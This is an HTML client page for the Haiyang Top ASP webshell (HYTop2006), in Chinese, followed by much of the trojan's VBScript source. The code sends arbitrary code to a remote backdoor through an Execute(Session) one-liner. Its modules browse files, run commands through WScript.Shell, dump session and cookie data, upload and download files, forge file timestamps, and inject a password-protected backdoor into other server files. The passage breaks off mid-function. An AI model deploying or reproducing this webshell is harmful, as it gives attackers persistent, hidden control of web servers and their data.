<html><head><meta http-equiv="Content-Type" content="text/html; charset=gb2312"><title>海阳顶端网ASP后门执行++</title></head><style>BODY {	FONT-SIZE: 9pt;	COLOR: #000000;	FONT-FAMILY: "Courier New";	scrollbar-face-color:#E4E4F3;	scrollbar-highlight-color:#FFFFFF;	scrollbar-3dlight-color:#E4E4F3;	scrollbar-darkshadow-color:#9C9CD3;	scrollbar-shadow-color:#E4E4F3;	scrollbar-arrow-color:#4444B3;	scrollbar-track-color:#EFEFEF;}TABLE {	FONT-SIZE: 9pt;	FONT-FAMILY: "Courier New";	BORDER-COLLAPSE: collapse;	border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;	border-top-style: solid;	border-right-style: none;	border-bottom-style: none;	border-left-style: solid;	border-top-color: #d8d8f0;	border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.tr {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	text-align: center;}.td {	font-family: "Courier New";	font-size: 9pt;	background-color: #f9f9fd;}.warningColor {	font-family: "Courier New";	font-size: 9pt;	color: #ff0000;}input {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;BORDER-RIGHT-WIDTH: 1px;	color: #000000;}textarea {	font-family: "Courier New";	BORDER-TOP-WIDTH: 1px;	BORDER-LEFT-WIDTH: 1px;	FONT-SIZE: 12px;	BORDER-BOTTOM-WIDTH: 1px;	BORDER-RIGHT-WIDTH: 1px;	color: #000000;}A:link {	FONT-SIZE: 9pt; 	COLOR: #000000;	FONT-FAMILY: "Courier New"; 	TEXT-DECORATION: none;}tr {	font-family: "Courier New";	font-size: 9pt;	line-height: 18px;}td {	font-family: "Courier New";	font-size: 9pt;	border-top-width: 1px;	border-right-width: 1px;	border-bottom-width: 1px;	border-left-width: 1px;	border-top-style: none;	border-right-style: solid;	border-bottom-style: solid;	border-left-style: none;	border-top-color: #d8d8f0;	border-right-color: #d8d8f0;	border-bottom-color: #d8d8f0;	border-left-color: #d8d8f0;}.trHead {	font-family: "Courier New";	font-size: 9pt;	background-color: #e4e4f3;	line-height: 3px;}.inputLogin {	font-family: "Courier New";	font-size: 9pt;	border: 1px solid #d8d8f0;	background-color: #f9f9fd;	vertical-align: bottom;}</style>
<body><table width="760" border="0" align="center" cellpadding="0" cellspacing="0"><form method="post" target="_blank"><tr>
      <td height="22" class="td"> &nbsp;海阳顶端网ASP后门执行++</td>
    </tr><tr><td class="trHead">&nbsp;</td></tr><tr><td height="18" align="center" class="td">&nbsp;表单提交地址: 
        <input name="theAction" type="text" id="theAction" value="http://" size="50">
        密码: 
        <input name="password" type="password" id="password" value="#" size="5"> <input name="Submit422" type="button" class="inputLogin" onClick="this.form.x.rows+=10;" value="+"> <input name="Submit42" type="button" class="inputLogin" onClick="if(this.form.x.rows>11){this.form.x.rows-=10;}" value="-"></td></tr><tr><td align="center" class="td"><input type=hidden name="#" id="sharp" value="Execute(&quot;Session(&quot;&quot;#&quot;&quot;)=Request(&quot;&quot;x&quot;&quot;):Execute(Session(&quot;&quot;#&quot;&quot;))&quot;)">
        <textarea name="x" cols="80" rows="30">On Error Resume Next
	Set ws=Server.CreateObject("WScript.Shell")
	On Error Resume Next
	Set ws=Server.CreateObject("WScript.Shell")
	On Error Resume Next
	Set fso=Server.CreateObject("Scripting.FileSystemObject")
	On Error Resume Next
	Set sa=Server.CreateObject("Shell.Application")
'	Option Explicit

	Dim theAct, sTime, aspPath, pageName, strBackDoor, fsoX, saX, wsX

	sTime = Timer
	theAct= Request("theAct")
	pageName = Request("pageName")
	aspPath = Replace(Server.MapPath(".") &amp; "\~86.tmp", "\\", "\") ''系统临时文件
	strBackDoor = "&lt;script language=vbscript runat=server>"
	strBackDoor = strBackDoor &amp; "If Request(""" &amp; clientPassword &amp; """)&lt;>"""" Then Session(""#"")=Request(""" &amp; clientPassword &amp; """)" &amp; VbNewLine
	strBackDoor = strBackDoor &amp; "If Session(""#"")&lt;>"""" Then Execute(Session(""#""))"
	strBackDoor = strBackDoor &amp; "&lt;/script>"							''插入的后门代码
	
	Const m = "HYTop2006"					''自定义Session前缀
	Const showLogin = ""					''为空直接显示登录界面,否则用"?%23=Execute(Session(%22%23%22))&amp;pageName=它的值"来进行访问
	Const clientPassword = "#"				''插入后门的密码,如果要插入数据库中,只能为一个字符.
	Const dbSelectNumber = 10				''数据库操作时默认从表中选取的数据量
	Const isDebugMode = False				''是否调试模式
	Const myName = "芝麻开门,偶是老马"			''登录页按扭上的文字
	Const notdownloadsExists = False		''原ACCESS数据库中是否存在notdownloadsExists表
	Const userPassword = "haha"		''管理密码
	Const myCmdDotExeFile = "command.com"	''定义cmd.exe文件的文件名
	Const strJsCloseMe = "&lt;input type=button value=' 关闭 ' onclick='window.close();'>"

	Sub createIt(fsoX, saX, wsX)
		If isDebugMode = False Then
			On Error Resume Next
		End If

		Set fsoX = Server.CreateObject("Scripting.FileSystemObject")
		If IsEmpty(fsoX) And (pageName = "FsoFileExplorer" Or theAct = "fsoSearch") Then
			Set fsoX = fso
		End If

		Set saX = Server.CreateObject("Shell.Application")
		If IsEmpty(saX) And (pageName = "AppFileExplorer" Or pageName = "SaCmdRun" Or theAct = "saSearch") Then
			Set saX = sa
		End If

		Set wsX = Server.CreateObject("WScript.Shell")
		If IsEmpty(wsX) And (pageName = "WsCmdRun" Or theAct = "getTerminalInfo" Or theAct = "readReg") Then
			Set wsX = ws
		End If

		If Err Then
			Err.Clear
		End If
	End Sub

	Sub chkErr(Err)
		If Err Then
			echo "&lt;style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}&lt;/style>"
			echo "&lt;br/>&lt;font size=2>&lt;li>错误: " &amp; Err.Description &amp; "&lt;/li>&lt;li>错误源: " &amp; Err.Source &amp; "&lt;/li>&lt;br/>"
			echo "&lt;hr>Powered By Marcos 2005.02&lt;/font>"
			Err.Clear
			Response.End
		End If
	End Sub
	
	Sub echo(str)
		Response.Write(str)
	End Sub
	
	Sub isIn()
		If pageName &lt;> "" And PageName &lt;> "login" And PageName &lt;> showLogin Then
			If Session(m &amp; "userPassword") &lt;> userPassword Then
				Response.End
			End If
		End If
	End Sub
	
	Sub showTitle(str)
		echo "&lt;title>" &amp; str &amp; " - 海阳顶端网ASP木马2006 - By Marcos &amp; LCX&lt;/title>" &amp; vbNewLine
		echo "&lt;meta http-equiv='Content-Type' content='text/html; charset=gb2312'>" &amp; vbNewLine
		echo "&lt;!--" &amp; vbNewLine
		echo "=衷心感谢=====================================================" &amp; vbNewLine
		echo "网辰在线、化境编程、桂林老兵、冰狐浪子、蓝屏、小路、wangyong、" &amp; vbNewLine
		echo "czy、allen、lcx、Marcos、kEvin1986、myth对海阳顶端网asp木马所" &amp; vbNewLine
		echo "做的一切努力！" &amp; vbNewLine
		echo "==============================================================" &amp; vbNewLine &amp; vbNewLine
		echo "=本版关于=====================================================" &amp; vbNewLine
		echo "程序编写: Marcos" &amp; vbNewLine
		echo "联系方式: QQ26696782" &amp; vbNewLine
		echo "发布时间: 2005.02.28" &amp; vbNewLine
		echo "出 品 人: Allen, lcx, Marcos" &amp; vbNewLine
		echo "官方发布: WWW.HIDIDI.NET(2) WWW.HAIYANGTOP.NET(1)" &amp; vbNewLine
		echo "==============================================================" &amp; vbNewLine
		echo "-->" &amp; vbNewLine
		PageOther()
	End Sub
	
	Function fixNull(str)
		If IsNull(str) Then
			str = " "
		End If
		fixNull = str
	End Function
	
	Function encode(str)
		str = Server.HTMLEncode(str)
		str = Replace(str, vbNewLine, "&lt;br>")
		str = Replace(str, " ", "&amp;nbsp;")
		str = Replace(str, "	", "&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;")
		encode = str
	End Function
	
	Function getTheSize(theSize)
		If theSize >= (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 &amp; "G"
		If theSize >= (1024 * 1024) And theSize &lt; (1024 * 1024 * 1024) Then getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 &amp; "M"
		If theSize >= 1024 And theSize &lt; (1024 * 1024) Then getTheSize = Fix((theSize / 1024) * 100) / 100 &amp; "K"
		If theSize >= 0 And theSize &lt;1024 Then getTheSize = theSize &amp; "B"
	End Function
	
	Function HtmlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		HtmlEncode = Server.HTMLEncode(str)
	End Function
	
	Function UrlEncode(str)
		If isNull(str) Then
			Exit Function
		End If
		UrlEncode = Server.UrlEncode(str)
	End Function
	
	Sub redirectTo(strUrl)
		Response.Redirect(Request.ServerVariables("URL") &amp; strUrl)
	End Sub

	Function trimThePath(strPath)
		If Right(strPath, 1) = "\" And Len(strPath) > 3 Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		trimThePath = strPath
	End Function

	Sub alertThenClose(strInfo)
		Response.Write "&lt;script>alert(""" &amp; strInfo &amp; """);window.close();&lt;/script>"
	End Sub

	Sub showErr(str)
		Dim i, arrayStr
		str = Server.HtmlEncode(str)
		arrayStr = Split(str, "$$")
'		Response.Clear
		echo "&lt;font size=2>"
		echo "出错信息:&lt;br/>&lt;br/>"
		For i = 0 To UBound(arrayStr)
			echo "&amp;nbsp;&amp;nbsp;" &amp; (i + 1) &amp; ". " &amp; arrayStr(i) &amp; "&lt;br/>"
		Next
		echo "&lt;/font>"
		Response.End
	End Sub

	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
	Rem     下面是程序模块选择部分
	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


	isIn()
	
	Call createIt(fsoX, saX, wsX)

	Select Case pageName
		Case showLogin, "login"
			PageLogin()
		Case "PageList"
			PageList()
		Case "objOnSrv"
			PageObjOnSrv()
		Case "ServiceList"
			PageServiceList()
		Case "userList"
			PageUserList()
		Case "CSInfo"
			PageCSInfo()
		Case "infoAboutSrv"
			PageInfoAboutSrv()
		Case "AppFileExplorer"
			PageAppFileExplorer()
		Case "SaCmdRun"
			PageSaCmdRun()
		Case "WsCmdRun"
			PageWsCmdRun()
		Case "FsoFileExplorer"
			PageFsoFileExplorer()
		Case "MsDataBase"
			PageMsDataBase()
		Case "OtherTools"
			PageOtherTools()
		Case "TxtSearcher"
			PageTxtSearcher()
		Case "PageAddToMdb"
			PageAddToMdb()
	End Select
	
	Set saX = Nothing
	Set wsX = Nothing
	Set fsoX = Nothing

	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
	Rem 	下面是各独立功能模块
	Rem =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

	Sub PageAppFileExplorer()
		Response.Buffer = True
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
		Dim intI, theAct, strTmp, strFolderList, strFileList, strFilePath, strFileName, strParentPath

		showTitle("Shell.Application文件浏览器(&amp;stream)")

		theAct = Request("theAct")
		strNewName = Request("newName")
		thePath = Replace(LTrim(Request("thePath")), "\\", "\")
		
		If theAct &lt;> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Replace(LTrim(Request.Form("thePath")), "\\", "\")
			End If
		End If

		echo "&lt;style>body{margin:8;}&lt;/style>"
		
		Select Case theAct
			Case "openUrl"
				openUrl(thePath)
			Case "showEdit"
				Call showEdit(thePath, "stream")
			Case "saveFile"
				Call saveToFile(thePath, "stream")
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("参数错误!")
					Response.End
				End If
				Session(m &amp; "appThePath") = thePath
				Session(m &amp; "appTheAct") = theAct
				alertThenClose("操作成功,请粘贴!")
			Case "pastOne"
				appDoPastOne(thePath)
				alertThenClose("粘贴成功,请刷新本页查看效果!")
			Case "rename"
				appRenameOne(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "theAttributes"
				appTheAttributes(thePath)
			Case "showUpload"
				Call showUpload(thePath, "AppFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "AppFileExplorer")
			Case "inject"
				strTmp = streamLoadFromFile(thePath)
				fsoSaveToFile thePath, strTmp &amp; strBackDoor
				alertThenClose("后门插入成功!")
		End Select
		
		If theAct &lt;> "" Then
			Response.End
		End If
		
		
		Set objFolder = saX.NameSpace(thePath)
		
		If Request.Form.Count > 0 Then
			redirectTo("?%23=Execute(Session(%22%23%22))&amp;pageName=AppFileExplorer&amp;thePath=" &amp; UrlEncode(thePath))
		End If
		echo "&lt;input type=hidden name=usePath />&lt;input type=hidden value=AppFileExplorer name=pageName />"
		echo "&lt;input type=hidden value=""" &amp; HtmlEncode(thePath) &amp; """ name=truePath />"
		echo "&lt;div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "&lt;input type=button value=' 打开 ' onclick='openUrl();'>"
		echo "&lt;input type=button value=' 编辑 ' onclick='editFile();'>"
		echo "&lt;input type=button value=' 复制 ' onclick=appDoAction('copyOne');>"
		echo "&lt;input type=button value=' 剪切 ' onclick=appDoAction('cutOne');>"
		echo "&lt;input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne');>"
		echo "&lt;input type=button value=' 上传 ' onclick='upTheFile();'>"
		echo "&lt;input type=button value=' 下载 ' onclick='downTheFile();'>"
		echo "&lt;input type=button value=' 属性 ' onclick='appTheAttributes();'>"
		echo "&lt;input type=button value=' 插入 ' onclick=appDoAction('inject');>"
		echo "&lt;input type=button value='重命名' onclick='appRename();'>"
		echo "&lt;input type=button value='我的电脑' onclick=location.href='?%23=Execute(Session(%22%23%22))&amp;pageName=AppFileExplorer&amp;thePath='>"
		echo "&lt;input type=button value='控制面板' onclick=location.href='?%23=Execute(Session(%22%23%22))&amp;pageName=AppFileExplorer&amp;thePath=::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\::{21EC2020-3AEA-1069-A2DD-08002B30309D}'>"
		echo "&lt;form method=post action='?pageName=AppFileExplorer'>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' />"
		echo "&lt;input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' />"
		echo "&lt;input type=button value=站点根 onclick=location.href=""?%23=Execute(Session(%22%23%22))&amp;pageName=AppFileExplorer&amp;thePath=" &amp; URLEncode(Server.MapPath("\")) &amp; """;>"
		echo "&lt;input style='width:60%;' name=thePath value=""" &amp; HtmlEncode(thePath) &amp; """ />"
		echo "&lt;input type=submit value=' GO.' />&lt;input type=button value=' 刷新 ' onclick='location.reload();'>&lt;/form>&lt;hr/>"
		echo "&lt;/div>&lt;div style='height:50px;'>&lt;/div>"
		echo "&lt;script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);&lt;/script>"

		For Each objMember In objFolder.Items
			intI = intI + 1
			If intI > 200 Then
				intI = 0
				Response.Flush()
			End If
			
			If objMember.IsFolder = True Then
				If Left(objMember.Path, 2) = "::" Then
					strPath = URLEncode(objMember.Path)
				 Else
					strPath = URLEncode(objMember.Path) &amp; "%5C"
				End If
				strFolderList = strFolderList &amp; "&lt;span id=""" &amp; strPath &amp; """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'>&lt;font class=font face=Wingdings>0&lt;/font>&lt;br/>" &amp; objMember.Name &amp; "&lt;/span>"
			 Else
			 	strDetails = objFolder.GetDetailsOf(objMember, -1)
			 	strFilePath = objMember.Path
				strFileName = Mid(strFilePath, InStrRev(strFilePath, "\") + 1)
				strExtName = Split(strFileName, ".")(UBound(Split(strFileName, ".")))
				strFileList = strFileList &amp; "&lt;span title=""" &amp; strDetails &amp; """ ondblclick='openUrl();' id=""" &amp; URLEncode(strFilePath) &amp; """ onclick='changeMyClass(this);'>&lt;font class=font face=" &amp; getFileIcon(strExtName) &amp; "&lt;/font>&lt;br/>" &amp; strFileName &amp; "&lt;/span>"
			End If
		Next
		chkErr(Err)

		strParentPath = getParentPath(thePath)
		If thePath &lt;> "" And Left(thePath, 2) &lt;> "::" Then
			strFolderList = "&lt;span id=""" &amp; URLEncode(strParentPath) &amp; """ ondblclick='changeThePath(this);' onclick='changeMyClass(this);'>&lt;font class=font face=Wingdings>0&lt;/font>&lt;br/>..&lt;/span>" &amp; strFolderList
		End If

		echo "&lt;div id=FileList>"
		echo strFolderList &amp; strFileList
		echo "&lt;/div>"
		echo "&lt;hr/>Powered By Marcos 2005.02"
		
		Set objFolder = Nothing
	End Sub
	
	Function getParentPath(strPath)
		If Right(strPath, 1) = "\" Then
			strPath = Left(strPath, Len(strPath) - 1)
		End If
		If Len(strPath) = 2 Then
			getParentPath = " "
		 Else
			getParentPath = Left(strPath, InStrRev(strPath, "\"))
		End If
	End Function

	Function streamSaveToFile(thePath, fileContent)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			chkErr(Err)
			.Charset="gb2312"
			.WriteText fileContent
			.saveToFile thePath, 2
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub appDoPastOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strAct, strPath
		dim objTargetFolder
		strAct = Session(m &amp; "appTheAct")
		strPath = Session(m &amp; "appThePath")
		
		If strAct = "" Or strPath = "" Then
			alertThenClose("参数错误,粘贴前请先复制/剪切!")
			Exit Sub
		End If
		
		If InStr(LCase(thePath), LCase(strPath)) > 0 Then
			alertThenClose("目标文件夹在源文件夹内,非法操作!")
			Exit Sub
		End If

		strPath = trimThePath(strPath)
		thePath = trimThePath(thePath)

		Set objTargetFolder = saX.NameSpace(thePath)
		If strAct = "copyOne" Then
			objTargetFolder.CopyHere(strPath)
		 Else
			objTargetFolder.MoveHere(strPath)
		End If
		chkErr(Err)
		
		Set objTargetFolder = Nothing
	End Sub
	
	Sub appTheAttributes(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, strSth, objFolder, objItem, strModifyDate
		strModifyDate = Request("ModifyDate")
		
		thePath = trimThePath(thePath)

		If thePath = "" Then
			alertThenClose("没有选择任何文件(夹)!")
			Exit Sub
		End If

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = saX.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)

		If isDate(strModifyDate) Then
			objItem.ModifyDate = strModifyDate
			alertThenClose("修改成功!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
'		strSth = objFolder.GetDetailsOf(objItem, -1)
'		strSth = Replace(strSth, chr(10), "&lt;br/>")
		For i = 1 To 8
			strSth = strSth &amp; "&lt;br/>属性(" &amp; i &amp; "): " &amp; objFolder.GetDetailsOf(objItem, i)
		Next
		strSth = Replace(strSth, "属性(1)", "大小")
		strSth = Replace(strSth, "属性(2)", "类型")
		strSth = Replace(strSth, "属性(3)", "最后修改")
		strSth = Replace(strSth, "属性(8)", "所有者")
		strSth = strSth &amp; "&lt;form method=post>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		strSth = strSth &amp; "&lt;input type=hidden name=theAct value=theAttributes>"
		strSth = strSth &amp; "&lt;input type=hidden name=thePath value=""" &amp; thePath &amp; """>"
		strSth = strSth &amp; "&lt;br/>最后修改: &lt;input size=30 value='" &amp; objFolder.GetDetailsOf(objItem, 3) &amp; "' name=ModifyDate />"
		strSth = strSth &amp; "&lt;input type=submit value=' 修改 '>"
		strSth = strSth &amp; "&lt;/form>"
		echo strSth
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub
	
	Sub appRenameOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strSth, fileName, objItem, objFolder
		fileName = Request("fileName")
		
		thePath = trimThePath(thePath)

		strSth = Left(thePath, InStrRev(thePath, "\"))
		Set objFolder = saX.NameSpace(strSth)
		chkErr(Err)
		strSth = Split(thePath, "\")(UBound(Split(thePath, "\")))
		Set objItem = objFolder.ParseName(strSth)
		chkErr(Err)
		strSth = Split(thePath, ".")(UBound(Split(thePath, ".")))
		
		If fileName &lt;> "" Then
			objItem.Name = fileName
			chkErr(Err)
			alertThenClose("重命名成功,刷新本页可以看到效果!")
			Set objItem = Nothing
			Set objFolder = Nothing
			Exit Sub
		End If
		
		echo "&lt;form method=post>重命名:"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		echo "&lt;input type=hidden name=theAct value=rename>"
		echo "&lt;input type=hidden name=thePath value=""" &amp; thePath &amp; """>"
		echo "&lt;br/>&lt;input size=30 value=""" &amp; objItem.Name &amp; """ name=fileName />"
		If InStr(strSth, ":") &lt;= 0 Then
			echo "." &amp; strSth
		End If
		echo "&lt;hr/>&lt;input type=submit value=' 修改 '>" &amp; strJsCloseMe
		echo "&lt;/form>"
		
		Set objItem = Nothing
		Set objFolder = Nothing
	End Sub

	Sub PageCSInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim strKey, strVar, strVariable
		
		showTitle("客户端服务器交互信息")
		
		echo "&lt;a href=javascript:showHideMe(ServerVariables);>ServerVariables:&lt;/a>"
		echo "&lt;span id=ServerVariables style='display:none;'>"
		For Each strVariable In Request.ServerVariables
			echo "&lt;li>" &amp; strVariable &amp; ": " &amp; Request.ServerVariables(strVariable) &amp; "&lt;/li>"
		Next
		echo "&lt;/span>"
		
		echo "&lt;br/>&lt;a href=javascript:showHideMe(Application);>Application:&lt;/a>"
		echo "&lt;span id=Application style='display:none;'>"
		For Each strVariable In Application.Contents
			echo "&lt;li>" &amp; strVariable &amp; ": " &amp; Encode(Application(strVariable)) &amp; "&lt;/li>"
			If Err Then
				For Each strVar In Application.Contents(strVariable)
					echo "&lt;li>" &amp; strVariable &amp; "(" &amp; strVar &amp; "): " &amp; Encode(Application(strVariable)(strVar)) &amp; "&lt;/li>"
				Next
				Err.Clear
			End If
		Next
		echo "&lt;/span>"

		echo "&lt;br/>&lt;a href=javascript:showHideMe(Session);>Session:(ID" &amp; Session.SessionId &amp; ")&lt;/a>"
		echo "&lt;span id=Session style='display:none;'>"
		For Each strVariable In Session.Contents
			echo "&lt;li>" &amp; strVariable &amp; ": " &amp; Encode(Session(strVariable)) &amp; "&lt;/li>"
		Next
		echo "&lt;/span>"
		
		echo "&lt;br/>&lt;a href=javascript:showHideMe(Cookies);>Cookies:&lt;/a>"
		echo "&lt;span id=Cookies style='display:none;'>"
		For Each strVariable In Request.Cookies
			If Request.Cookies(strVariable).HasKeys Then
				For Each strKey In Request.Cookies(strVariable)
					echo "&lt;li>" &amp; strVariable &amp; "(" &amp; strKey &amp; "): " &amp; HtmlEncode(Request.Cookies(strVariable)(strKey)) &amp; "&lt;/li>"
				Next
			 Else
				echo "&lt;li>" &amp; strVariable &amp; ": " &amp; Encode(Request.Cookies(strVariable)) &amp; "&lt;/li>"
			End If
		Next
		echo "&lt;/span>&lt;hr/>Powered By Marcos 2005.02"
		
	End Sub

	Sub PageFsoFileExplorer()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Response.Buffer = True
		Dim file, drive, folder, theFiles, theFolder, theFolders
		Dim i, theAct, strTmp, driveStr, thePath, parentFolderName
		
		theAct = Request("theAct")
		thePath = Request("thePath")
		If theAct &lt;> "upload" Then
			If Request.Form.Count > 0 Then
				theAct = Request.Form("theAct")
				thePath = Request.Form("thePath")
			End If
		End If

		showTitle("FSO文件浏览器(&amp;stream)")
		
		Select Case theAct
			Case "newOne", "doNewOne"
				fsoNewOne(thePath)
			Case "showEdit"
				Call showEdit(thePath, "fso")
			Case "saveFile"
				Call saveToFile(thePath, "fso")
			Case "openUrl"
				openUrl(thePath)
			Case "copyOne", "cutOne"
				If thePath = "" Then
					alertThenClose("参数错误!")
					Response.End
				End If
				Session(m &amp; "fsoThePath") = thePath
				Session(m &amp; "fsoTheAct") = theAct
				alertThenClose("操作成功,请粘贴!")
			Case "pastOne"
				fsoPastOne(thePath)
				alertThenClose("粘贴成功,请刷新本页查看效果!")
			Case "showFsoRename"
				showFsoRename(thePath)
			Case "doRename"
				Call fsoRename(thePath)
				alertThenClose("重命名成功,刷新后可以看到效果!")
			Case "delOne", "doDelOne"
				showFsoDelOne(thePath)
			Case "getAttributes", "doModifyAttributes"
				fsoTheAttributes(thePath)
			Case "downTheFile"
				downTheFile(thePath)
			Case "showUpload"
				Call showUpload(thePath, "FsoFileExplorer")
			Case "upload"
				streamUpload(thePath)
				Call showUpload(thePath, "FsoFileExplorer")
			Case "inject"
				Set theFiles = fsoX.OpenTextFile(thePath)
				strTmp = theFiles.ReadAll()
				fsoSaveToFile thePath, strTmp &amp; strBackDoor
				Set theFiles = Nothing
				alertThenClose("后门插入成功!")
		End Select
		
		If theAct &lt;> "" Then
			Response.End
		End If
		
		If Request.Form.Count > 0 Then
			redirectTo("?%23=Execute(Session(%22%23%22))&amp;pageName=FsoFileExplorer&amp;thePath=" &amp; UrlEncode(thePath))
		End If
		
		parentFolderName = fsoX.GetParentFolderName(thePath)
		
		echo "&lt;div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools>"
		echo "&lt;input type=button value=' 新建 ' onclick=newOne();>"
		echo "&lt;input type=button value=' 更名 ' onclick=fsoRename();>"
		echo "&lt;input type=button value=' 编辑 ' onclick=editFile();>"
		echo "&lt;input type=button value=' 打开 ' onclick=openUrl();>"
		echo "&lt;input type=button value=' 复制 ' onclick=appDoAction('copyOne');>"
		echo "&lt;input type=button value=' 剪切 ' onclick=appDoAction('cutOne');>"
		echo "&lt;input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne')>"
		echo "&lt;input type=button value=' 属性 ' onclick=fsoGetAttributes();>"
		echo "&lt;input type=button value=' 插入 ' onclick=appDoAction('inject');>"
		echo "&lt;input type=button value=' 删除 ' onclick=delOne();>"
		echo "&lt;input type=button value=' 上传 ' onclick='upTheFile();'>"
		echo "&lt;input type=button value=' 下载 ' onclick='downTheFile();'>"
		echo "&lt;br/>"
		echo "&lt;input type=hidden value=FsoFileExplorer name=pageName />"
		echo "&lt;input type=hidden value=""" &amp; UrlEncode(thePath) &amp; """ name=truePath>"
		echo "&lt;input type=hidden size=50 name=usePath>"

		echo "&lt;form method=post action=?pageName=FsoFileExplorer>"
		echo "&lt;input type=hidden name=""#"" value=Execute(Session(""#""))>"
		If parentFolderName &lt;> "" Then
			echo "&lt;input value='↑向上' type=button onclick=""this.disabled=true;location.href='?%23=Execute(Session(%22%23%22))&amp;pageName=FsoFileExplorer&amp;thePath=" &amp; Server.UrlEncode(parentFolderName) &amp; "';"">"
		End If
		echo "&lt;input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' />"
		echo "&lt;input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' />"
		echo "&lt;input size=60 value=""" &amp; HtmlEncode(thePath) &amp; """ name=thePath>"
		echo "&lt;input type=submit value=' 转到 '>"
		driveStr = "&lt;option>盘符&lt;/option>"
		driveStr = driveStr &amp; "&lt;option value='" &amp; HtmlEncode(Server.MapPath(".")) &amp; "'>.&lt;/option>"
		driveStr = driveStr &amp; "&lt;option value='" &amp; HtmlEncode(Server.MapPath("/")) &amp; "'>/&lt;/option>"
		For Each drive In fsoX.Drives
			driveStr = driveStr &amp; "&lt;option value='" &amp; drive.DriveLetter &amp; ":\'>" &amp; drive.DriveLetter &amp; ":\&lt;/option>"
		Next
		echo "&lt;input type=button value=' 刷新 ' onclick='location.reload();'> "
		echo "&lt;select onchange=""this.form.thePath.value=this.value;this.form.submit();"">" &amp; driveStr &amp; "&lt;/select>"
		echo "&lt;hr/>&lt;/form>"
		echo "&lt;/div>&lt;div style='height:50px;'>&lt;/div>"
		echo "&lt;script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);&lt;/script>"

		If fsoX.FolderExists(thePath) = False Then
			showErr(thePath &amp; " 目录不存在或者不允许访问!")
		End If
		Set theFolder = fsoX.GetFolder(thePath)
		Set theFiles = theFolder.Files
		Set theFolders = theFolder.SubFolders

		echo "&lt;div id=FileList>"
		For Each folder In theFolders
			i = i + 1
			If i > 50 Then
				i = 0
				Response.Flush()
			End If
			strTmp = UrlEncode(folder.Path &amp; "\")
			echo "&lt;span id='" &amp; strTmp &amp; "' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);>&lt;font class=font face=Wingdings>0&lt;/font>&lt;br/>" &amp; folder.Name &amp; "&lt;/span>" &amp; vbNewLine
		Next
		Response.Flush()
		For Each file In theFiles
			i = i + 1
			If i > 100 Then
				i = 0
				Response.Flush()
			End If
			echo "&lt;span id='" &amp; UrlEncode(file.Path) &amp; "' title='类型: " &amp; file.Type &amp; vbNewLine &amp; "大小: " &amp; getTheSize(file.Size) &amp; "' onDblClick=""openUrl();"" onclick=changeMyClass(this);>&lt;font class=font face=" &amp; getFileIcon(fsoX.GetExtensionName(file.Name)) &amp; "&lt;/font>&lt;br/>" &amp; file.Name &amp; "&lt;/span>" &amp; vbNewLine
		Next
		echo "&lt;/div>"
		chkErr(Err)
		
		echo "&lt;hr/>Powered By Marcos 2005.02"
	End Sub
	
	Sub fsoNewOne(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theAct, isFile, theName, newAct
		isFile = Request("isFile")
		newAct = Request("newAct")
		theName = Request("theName")

		If newAct = " 确定 " Then
			thePath = Replace(thePath &amp; "\" &amp; theName, "\\", "\")
			If isFile = "True" Then
